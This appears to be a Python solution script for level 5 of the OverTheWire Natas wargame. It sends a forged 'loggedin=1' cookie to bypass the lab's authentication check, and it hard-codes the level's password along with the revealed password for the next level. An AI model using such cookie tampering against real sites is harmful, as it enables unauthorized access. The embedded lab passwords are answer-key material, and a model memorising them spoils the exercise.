#!/usr/bin/env python

import requests
import re
print("Natas Level 5")


username = "natas5"
password = "iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq"

url = "http://%s.natas.labs.overthewire.org/"%(username)

headers = {
	"Referer" : "http://natas5.natas.labs.overthewire.org/"
}

cookies = {
	"loggedin":"1"
}

with requests.session() as session:
	response = session.get(url, auth = (username, password), cookies = cookies)

	# print(response.cookies)

	content = response.text 

	# print( content)

	print( re.findall("Access granted. The password for natas6 is (.*)</div>", content)[0] )

#  Access granted. The password for natas6 is aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1</div>
